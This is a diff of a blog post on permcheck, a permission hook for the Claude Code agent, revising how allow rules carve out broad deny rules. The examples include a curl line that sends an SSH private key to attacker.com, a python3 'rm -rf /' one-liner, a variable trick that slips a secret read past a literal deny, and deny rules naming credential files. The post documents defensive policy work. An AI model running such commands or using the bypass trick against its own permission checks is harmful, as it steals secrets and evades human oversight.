@@ -13,24 +13,24 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>When Deny Doesn't Win: least-privilege permissions for Claude Code</title>
-<meta name="description" content="Claude Code resolves permission conflicts with a fixed deny-always-wins rule. permcheck runs as a PreToolUse hook and lets the most specific rule win instead.">
+<meta name="description" content="Claude Code resolves permission conflicts with a fixed deny-always-wins rule. permcheck runs as a PreToolUse hook and lets a narrower rule carve out a broader one instead.">
 <link rel="canonical" href="https://blogs.zethian.com/when-deny-doesnt-win">
 
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="Zethian">
 <meta property="og:title" content="When deny doesn't win">
-<meta property="og:description" content="Claude Code resolves permission conflicts with a fixed deny-always-wins rule. permcheck runs as a PreToolUse hook and lets the most specific rule win instead.">
+<meta property="og:description" content="Claude Code resolves permission conflicts with a fixed deny-always-wins rule. permcheck runs as a PreToolUse hook and lets a narrower rule carve out a broader one instead.">
 <meta property="og:url" content="https://blogs.zethian.com/when-deny-doesnt-win">
 <meta property="og:image" content="https://blogs.zethian.com/blog-assets/diagram-2-native-vs-permcheck.png">
 <meta property="og:image:width" content="1720">
 <meta property="og:image:height" content="800">
-<meta property="og:image:alt" content="The same aws describe call: the native deny-always-wins model blocks it, permcheck lets the higher-specificity allow win.">
+<meta property="og:image:alt" content="The same aws describe call: the native deny-always-wins model blocks it, permcheck lets a narrower allow carve-out win.">
 
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="When deny doesn't win">
-<meta name="twitter:description" content="Claude Code resolves permission conflicts with a fixed deny-always-wins rule. permcheck lets the most specific rule win instead.">
+<meta name="twitter:description" content="Claude Code resolves permission conflicts with a fixed deny-always-wins rule. permcheck lets a narrower rule carve out a broader one instead.">
 <meta name="twitter:image" content="https://blogs.zethian.com/blog-assets/diagram-2-native-vs-permcheck.png">
-<meta name="twitter:image:alt" content="The same aws describe call: the native deny-always-wins model blocks it, permcheck lets the higher-specificity allow win.">
+<meta name="twitter:image:alt" content="The same aws describe call: the native deny-always-wins model blocks it, permcheck lets a narrower allow carve-out win.">
 <style>
   :root {
     --bg: #fbfcfe;
@@ -431,7 +431,7 @@ allow: Bash(aws * describe-*)</code></pre>
   <p><code>aws ec2 describe-instances</code> matches both. Watch the two models diverge:</p>
 
   <figure class="fig">
-    <svg viewBox="0 0 860 400" role="img" aria-label="The same aws describe call is blocked by the native deny-always-wins model but allowed by permcheck, where the higher-specificity allow beats the broad deny.">
+    <svg viewBox="0 0 860 400" role="img" aria-label="The same aws describe call is blocked by the native deny-always-wins model but allowed by permcheck, where a narrower allow carves out the broad deny.">
       <defs>
         <marker id="ah2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#57606a"/></marker>
         <marker id="ah2d" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#8c959f"/></marker>
@@ -463,7 +463,7 @@ allow: Bash(aws * describe-*)</code></pre>
       <line x1="710" y1="254" x2="710" y2="312" stroke="#8c959f" stroke-width="1.5" stroke-dasharray="5 4" marker-end="url(#ah2d)"/>
       <text x="740" y="288" text-anchor="middle" font-size="11" font-style="italic" fill="#8c959f" font-family="system-ui, sans-serif">loses</text>
     </svg>
-    <figcaption>Same call, two models. Native precedence blocks it; permcheck lets the higher-specificity allow win.</figcaption>
+    <figcaption>Same call, two models. Native precedence blocks it; permcheck lets a narrower allow carve-out win.</figcaption>
   </figure>
 
   <p>The native model leaves you two bad choices:</p>
@@ -490,11 +490,11 @@ allow: Bash(aws * describe-*)</code></pre>
 
   <div class="callout">
     <p class="label">The rule</p>
-    <p>permcheck drops "deny always wins". It gathers <strong>every</strong> matching rule across the tool's matchers, then selects the winner by the pair <code>(specificity, tier)</code>, compared lexicographically. Specificity dominates; tier only breaks ties. "Most specific" is the highest specificity score, a deterministic number defined next, not a semantic judgment.</p>
+    <p>permcheck softens "deny always wins" into one principled exception: a <strong>carve-out</strong>. It gathers <strong>every</strong> matching rule across the tool's matchers. A matching <code>deny</code> holds unless a matching <code>allow</code>/<code>ask</code> is a <em>strict subset</em> of it — a genuine narrower exception (<code>allow ⊆ deny</code> and <code>deny ⊄ allow</code>). If any matching deny is not carved out, the call is denied. Otherwise the winner among the allow/ask rules is the one with the highest <code>(specificity, tier)</code>.</p>
   </div>
 
   <p>Specificity is a number you compute by hand: count the literal, non-wildcard characters in the specifier, add 1000 if the specifier has no wildcard at all. Wildcards are <code>*</code> for every family, plus <code>?</code> for path globs. The <code>+1000</code> exact-match bonus guarantees a literal specifier outranks any wildcard specifier regardless of length.</p>
-  <p>Why count characters instead of measuring what each rule matches? There is no clean way to compare the match sets of a path glob, a URL host, and a Bash prefix; they are different shapes. A character count is one number that works across all of them, it is deterministic, and you read it straight off the rule. permcheck trades perfect semantic ordering for a score you predict and review. The same reasoning rules out a manual priority field: an explicit priority is one more value to assign, reconcile, and keep correct as the policy grows, and it drifts out of sync with the rules it ranks.</p>
+  <p>Specificity no longer decides <code>allow</code> versus <code>deny</code>; containment does. The score only orders rules pulling the same direction (which allow/ask wins when several match) and gives a stable, reviewable tie-break. Cross-tier precedence asks a sharper question: does the allow sit <em>inside</em> the deny? A longer specifier that merely overlaps a deny no longer punches through it. The same reasoning rules out a manual priority field: an explicit priority is one more value to assign, reconcile, and keep correct as the policy grows, and it drifts out of sync with the rules it ranks.</p>
   <p>Worked out on real rules (the <code>:*</code> suffix is a wildcard marker, so it earns no literal count and no bonus):</p>
 
   <div class="tbl-scroll">
@@ -511,14 +511,14 @@ allow: Bash(aws * describe-*)</code></pre>
     </table>
   </div>
 
-  <p>Higher wins. <code>Bash(aws * describe-*)</code> at 14 beats <code>Bash(aws:*)</code> at 3, so a describe call is allowed while every other <code>aws</code> call stays denied. <code>Read(/home/user/.ssh/id_rsa)</code> has no wildcard, so its <code>+1000</code> bonus puts it far above any bare <code>Read</code> allow at 0. So the read-only policy that was impossible now works.</p>
-  <p>The fully literal <code>Read(/home/user/.ssh/id_rsa)</code> here is illustrative, chosen to show the exact-match bonus. The shipped set protects the same key with wildcard globs such as <code>Read(//**/id_rsa*)</code>, which carry no bonus and score low; they win because they still outscore the bare <code>Read</code> allow at 0, not because of the <code>+1000</code>.</p>
+  <p>Every string <code>Bash(aws * describe-*)</code> matches is also an <code>aws …</code> command, so it is a strict subset of <code>Bash(aws:*)</code> — a real carve-out. A describe call is allowed while every other <code>aws</code> call stays denied. Among allow/ask winners the score still orders: <code>Read(/home/user/.ssh/id_rsa)</code> has no wildcard, so its <code>+1000</code> bonus puts it far above any bare <code>Read</code> allow at 0. So the read-only policy that was impossible now works.</p>
+  <p>The fully literal <code>Read(/home/user/.ssh/id_rsa)</code> here is illustrative, chosen to show the exact-match bonus. The shipped set protects the same key with wildcard globs such as <code>Read(//**/id_rsa*)</code>, which carry no bonus and score low; they hold against the bare <code>Read</code> allow because a match-everything allow is not a subset carve-out of them, so the deny wins regardless of score.</p>
 
   <div class="tbl-scroll">
     <table>
       <thead><tr><th>Call</th><th>Native</th><th>permcheck</th><th>Why</th></tr></thead>
       <tbody>
-        <tr><td><code>aws ec2 describe-instances</code></td><td><span class="v deny">deny</span></td><td><span class="v allow">allow</span></td><td><code>aws * describe-*</code> (14) beats <code>aws:*</code> deny (3)</td></tr>
+        <tr><td><code>aws ec2 describe-instances</code></td><td><span class="v deny">deny</span></td><td><span class="v allow">allow</span></td><td><code>aws * describe-*</code> is a strict subset carve-out of <code>aws:*</code> deny</td></tr>
         <tr><td><code>aws ec2 terminate-instances</code></td><td><span class="v deny">deny</span></td><td><span class="v deny">deny</span></td><td>only <code>aws:*</code> deny matches</td></tr>
         <tr><td><code>aws s3api list-buckets</code></td><td><span class="v deny">deny</span></td><td><span class="v deny">deny</span></td><td>only <code>aws:*</code> deny matches</td></tr>
       </tbody>
@@ -526,21 +526,21 @@ allow: Bash(aws * describe-*)</code></pre>
   </div>
 
   <p>These two <code>aws</code> rules are the policy you write, not the shipped default. The starter set denies <code>aws</code> wholesale, so add the <code>describe</code> allow yourself to reproduce the row above.</p>
-  <p>The narrow allow punches through the broad deny. Flip it and a narrow deny punches through a broad allow the same way. That two-way override is the entire reason permcheck exists. One caveat: "narrow" is measured by character count, a proxy for a smaller match set that can diverge from it. <a href="#tune-your-rules-not-the-engine">Tune your rules</a> shows where the two part ways and how to author around it.</p>
+  <p>The narrow allow punches through the broad deny. Flip it and a narrow deny punches through a broad allow the same way. That two-way override is the entire reason permcheck exists. "Narrow" now means a genuine subset: the allow must sit inside the deny for the carve-out to fire. <a href="#tune-your-rules-not-the-engine">Tune your rules</a> shows how to shape an allow so it lands inside the deny it must beat.</p>
 
   <div class="callout">
     <p class="label">Assumptions</p>
     <p>This override runs among the rules in your <code>permcheck.json</code>, where permcheck resolves them into one verdict. It does not reach across into Claude's native permissions: permcheck tightens the native decision, it never loosens it. A native <code>deny</code> or <code>ask</code> in your enterprise or user <code>settings.json</code> still wins, even when permcheck returns <code>allow</code>. See <a href="#where-it-fits">Where it fits</a>.</p>
     <p>So permcheck assumes the <code>deny</code> section of your enterprise and user <code>settings.json</code> is empty, or at least holds nothing that conflicts with <code>permcheck.json</code>. You own the policy across all three (enterprise, user, and <code>permcheck.json</code>): permcheck enforces what you write, it does not infer intent or repair a conflicting or overly permissive set.</p>
   </div>
-  <p>Ties resolve the way you expect: equal specificity falls back to <code>deny &gt; ask &gt; allow</code>, and a full tie takes the first rule in file order.</p>
+  <p>Ties among allow/ask resolve the way you expect: equal specificity takes the more restrictive tier (<code>ask</code> over <code>allow</code>), and a full tie takes the first rule in file order.</p>
   <p>Nothing matches? The rule set's <code>defaultMode</code> decides. With <code>defaultMode: deny</code> (the engine's default when the key is absent) an unlisted call fails closed; with <code>ask</code> it prompts. The shipped starter sets <code>ask</code>, so out of the box an unlisted call prompts. In a non-interactive setting (CI, a headless agent) where no one answers a prompt, set <code>deny</code> so calls fail closed rather than stall. This applies only to the no-rule-matched case: it never loosens a cross-check <code>deny</code> or the error posture, both of which stay <code>deny</code> regardless.</p>
 
   <h2 id="the-whole-pipeline">The whole pipeline</h2>
   <p>Every tool call, Bash or not, runs the same route: extract the payload, match rules, score, pick the winner. Bash gets three extra safety steps first.</p>
 
   <figure class="fig">
-    <svg viewBox="0 0 840 600" role="img" aria-label="Evaluation pipeline: route by tool to path glob, URL match, or Bash split; Bash also peels wrappers and cross-checks file access; then every matching rule is scored and the most specific wins. Any error fails closed to deny.">
+    <svg viewBox="0 0 840 600" role="img" aria-label="Evaluation pipeline: route by tool to path glob, URL match, or Bash split; Bash also peels wrappers and cross-checks file access; then carve-outs, and specificity among allow/ask, pick the winner. Any error fails closed to deny.">
       <defs><marker id="ah3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#57606a"/></marker>
       <marker id="ah3r" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#cf222e"/></marker></defs>
       <line x1="410" y1="60" x2="410" y2="93" stroke="#57606a" stroke-width="1.5" marker-end="url(#ah3)"/>
@@ -564,7 +564,7 @@ allow: Bash(aws * describe-*)</code></pre>
         <rect x="575" y="168" width="190" height="44" rx="8" fill="#f6f8fa" stroke="#d0d7de" stroke-width="1.5"/><text x="670" y="195" font-size="12.5" fill="#1f2328">Split into units (Bash)</text>
         <rect x="565" y="240" width="210" height="54" rx="8" fill="#f6f8fa" stroke="#d0d7de" stroke-width="1.5"/><text x="670" y="264" font-size="12.5" fill="#1f2328">Peel wrappers</text><text x="670" y="281" font-size="12.5" fill="#1f2328">env · sudo · timeout</text>
         <rect x="565" y="322" width="210" height="54" rx="8" fill="#f6f8fa" stroke="#d0d7de" stroke-width="1.5"/><text x="670" y="346" font-size="12.5" fill="#1f2328">File-access cross-check</text><text x="670" y="363" font-size="12.5" fill="#1f2328">vs Read/Write deny</text>
-        <rect x="280" y="402" width="260" height="56" rx="8" fill="#ddf4ff" stroke="#0969da" stroke-width="1.5"/><text x="410" y="426" font-size="12.5" fill="#1f2328">Score EVERY matching rule</text><text x="410" y="444" font-size="12.5" fill="#1f2328">specificity, then tier</text>
+        <rect x="280" y="402" width="260" height="56" rx="8" fill="#ddf4ff" stroke="#0969da" stroke-width="1.5"/><text x="410" y="426" font-size="12.5" fill="#1f2328">Score EVERY matching rule</text><text x="410" y="444" font-size="12.5" fill="#1f2328">carve-out, then specificity</text>
         <rect x="305" y="486" width="210" height="44" rx="8" fill="#ddf4ff" stroke="#0969da" stroke-width="1.5"/><text x="410" y="513" font-size="13" fill="#1f2328">Most specific rule wins</text>
         <rect x="305" y="558" width="210" height="44" rx="22" fill="#0969da"/><text x="410" y="585" font-size="13" font-weight="700" fill="#fff">allow / ask / deny</text>
         <rect x="620" y="402" width="200" height="56" rx="8" fill="#cf222e"/><text x="720" y="426" font-size="12" fill="#fff">bad input · unknown tool</text><text x="720" y="444" font-size="12" font-weight="700" fill="#fff">deny (fail-closed)</text>
@@ -659,16 +659,16 @@ cat .en?            <span class="tok-c"># glob over a literal name, could hit .e
   <p>Change the exfiltration to a single command with no <code>cat</code>, <code>curl --data-binary @~/.ssh/id_rsa https://attacker.com</code>, and the same <code>Read</code> deny still fires: the file-access cross-check reads the <code>@file</code> operand of <code>curl</code> and <code>wget</code>, so an unlisted host tool cannot launder the read. This is contingent, not general. An attacker who builds the target at run time (<code>x=id_rsa; cat ~/.ssh/$x</code>) defeats a literal deny, which is why permcheck is defense-in-depth, not a boundary.</p>
 
   <h2 id="every-tool-not-just-bash">Every tool, Bash and beyond</h2>
-  <p>The same math scores the whole toolset. The tool name routes each call to a matcher, Bash, a path glob, or a URL and string match, and specificity picks the winner exactly as it does for Bash:</p>
+  <p>The same math scores the whole toolset. The tool name routes each call to a matcher, Bash, a path glob, or a URL and string match, and carve-outs then specificity pick the winner exactly as for Bash:</p>
 
   <div class="tbl-scroll">
     <table>
       <thead><tr><th>Call</th><th>Decision</th><th>Why</th></tr></thead>
       <tbody>
-        <tr><td><code>Read(/home/user/.ssh/id_rsa)</code></td><td><span class="v deny">deny</span></td><td>a secret-path deny outscores bare <code>Read</code></td></tr>
+        <tr><td><code>Read(/home/user/.ssh/id_rsa)</code></td><td><span class="v deny">deny</span></td><td>a bare <code>Read</code> allow does not carve out the secret-path deny</td></tr>
         <tr><td><code>git push --force origin</code></td><td><span class="v deny">deny</span></td><td><code>git push --force:*</code> (16) beats <code>git push:*</code> ask (8)</td></tr>
         <tr><td><code>WebFetch(https://evil.io)</code></td><td><span class="v deny">deny</span></td><td>bare <code>WebFetch</code> deny, nothing narrower allows</td></tr>
-        <tr><td><code>WebFetch(domain:docs.internal.co)</code></td><td><span class="v allow">allow</span></td><td>a domain allow you add outscores the bare deny</td></tr>
+        <tr><td><code>WebFetch(domain:docs.internal.co)</code></td><td><span class="v allow">allow</span></td><td>a domain allow you add is a subset carve-out of the bare deny</td></tr>
       </tbody>
     </table>
   </div>
@@ -678,10 +678,10 @@ cat .en?            <span class="tok-c"># glob over a literal name, could hit .e
   <h2 id="tune-your-rules-not-the-engine">Tune your rules, not the engine</h2>
   <p>Specificity counts literal characters, a proxy for how narrow a rule is, not a measure of its scope, so a loose rule grants more than you intend. Take the shipped <code>Bash(python3 *)</code> allow. On its own a bare interpreter allow swallows arbitrary code:</p>
   <pre><code>python3 -c "import os; os.system('rm -rf /')"</code></pre>
-  <p>The engine did its job; the rule was too wide. The fix is a paired deny that outscores it, and the reference set now ships exactly that:</p>
-  <pre><code>allow: Bash(python3 *)          <span class="tok-c"># score 8</span>
-deny:  Bash(python3 -c:*)       <span class="tok-c"># score 10  ◄─ wins on -c calls</span></code></pre>
-  <p>So <code>python3 -c</code> is denied out of the box, while <code>python3 script.py</code> stays allowed. The same proxy cuts the other way across tiers. When an allow and a deny overlap, the longer specifier wins on character count even when its match set is wider. <code>allow Read(/**/passwd)</code> scores 8 and <code>deny Read(/etc/**)</code> scores 5, so <code>/etc/passwd</code> is allowed, even though the allow reaches every <code>passwd</code> on the system and is not a subset of the deny. The engine takes the higher score at face value and does not check that the allow sits inside the deny. Author for it: make a deny out-score the allow it must beat, or keep the allow a strict subset of the deny.</p>
+  <p>The engine did its job; the rule was too wide. The fix is a paired deny for the dangerous subform, and the reference set now ships exactly that:</p>
+  <pre><code>allow: Bash(python3 *)          <span class="tok-c"># broad allow</span>
+deny:  Bash(python3 -c:*)       <span class="tok-c"># holds: the allow is not a subset of it</span></code></pre>
+  <p>So <code>python3 -c</code> is denied out of the box, while <code>python3 script.py</code> stays allowed: the <code>-c</code> deny holds because the broad allow does not sit inside it. Containment protects you the other way across tiers too. A wide allow that only overlaps a deny no longer punches through it. <code>allow Read(/**/passwd)</code> reaches every <code>passwd</code> on the system, so it is <em>not</em> a subset of <code>deny Read(/etc/**)</code>; the two only overlap, and <code>/etc/passwd</code> is <strong>denied</strong>. To grant a real exception, make the allow a strict subset of the deny — a literal <code>allow Read(/etc/passwd)</code>, which sits entirely inside <code>/etc/**</code>, carves it out and is allowed.</p>
   <p>The reference set applies the same discipline to its other broad allows. The inline-code form of every shipped interpreter is denied (<code>perl -e</code>, <code>ruby -e</code>, <code>node -e</code>, <code>deno eval</code>, <code>php -r</code>, and <code>python</code>/<code>python2 -c</code>). Under <code>Bash(gh:*)</code>, <code>gh auth token</code> is denied and <code>gh api</code> is downgraded to <code>ask</code>. The arbitrary-package runners under <code>yarn:*</code>/<code>pnpm:*</code>/<code>uv:*</code> (<code>yarn dlx</code>, <code>pnpm dlx</code>, <code>pnpm exec</code>, <code>uv run</code>, <code>uvx</code>, <code>uv tool run</code>) are denied.</p>
   <p>One residual stays open by design: <code>npm install</code>, <code>pip install</code>, and their peers run each package's build and lifecycle code, which a prefix deny cannot separate from a safe install without breaking routine dependency installs. That is a sandbox concern, not a rule fix. When you author your own broad allow, pair it with denies for its dangerous subforms the same way. The CLI checker lints for an authoring mistake: a <code>cmd:*</code> rule whose <code>*</code> sits before the <code>:*</code>, which matches nothing.</p>
 
@@ -789,7 +789,7 @@ deny:  Bash(python3 -c:*)       <span class="tok-c"># score 10  ◄─ wins on -
       </tbody>
     </table>
   </div>
-  <p>This is why the specificity override applies only among rules <em>inside</em> <code>permcheck.json</code>. Do not split a broad <code>deny</code> and its narrow <code>allow</code> exception across the two files expecting the narrow rule to punch through: the native <code>deny</code> wins and the exception never fires. Keep both rules in <code>permcheck.json</code>, where permcheck resolves them into one verdict.</p>
+  <p>This is why the carve-out override applies only among rules <em>inside</em> <code>permcheck.json</code>. Do not split a broad <code>deny</code> and its narrow <code>allow</code> exception across the two files expecting the narrow rule to punch through: the native <code>deny</code> wins and the exception never fires. Keep both rules in <code>permcheck.json</code>, where permcheck resolves them into one verdict.</p>
   <p>Migrating from native rules follows the same rule. If a rule family lives in <code>settings.json</code> today, move the whole family into <code>permcheck.json</code> before you add exceptions. Take a native <code>deny Bash(aws:*)</code>: copy it into <code>permcheck.json</code>, then add the narrow <code>allow Bash(aws * describe-*)</code> beside it. Leave the <code>deny</code> in <code>settings.json</code> while the <code>allow</code> sits in <code>permcheck.json</code>, and every <code>aws</code> call stays blocked, because the native deny wins.</p>
 
   <h3>Who owns the policy</h3>
